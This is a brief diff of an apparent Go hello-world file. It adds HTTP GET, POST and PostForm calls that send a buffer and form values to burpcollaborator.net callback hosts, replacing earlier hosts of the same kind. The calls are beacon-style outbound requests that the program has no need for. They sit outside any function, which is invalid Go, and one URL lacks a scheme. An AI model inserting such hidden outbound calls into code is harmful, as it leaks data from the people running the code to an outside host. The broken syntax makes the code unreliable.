@@ -8,7 +8,7 @@ func main() {
     fmt.Println(quote.Go())
 }
 
-resp, err := http.Get("http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/vanilla")
-resp, err := http.Post("http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/upload", "image/jpeg", &buf)
-resp, err := http.PostForm("http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/form",
+resp, err := http.Get("mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net")
+resp, err := http.Post("http://mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net/upload", "image/jpeg", &buf)
+resp, err := http.PostForm("http://mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net/form",
 	url.Values{"key": {"Value"}, "id": {"123"}})
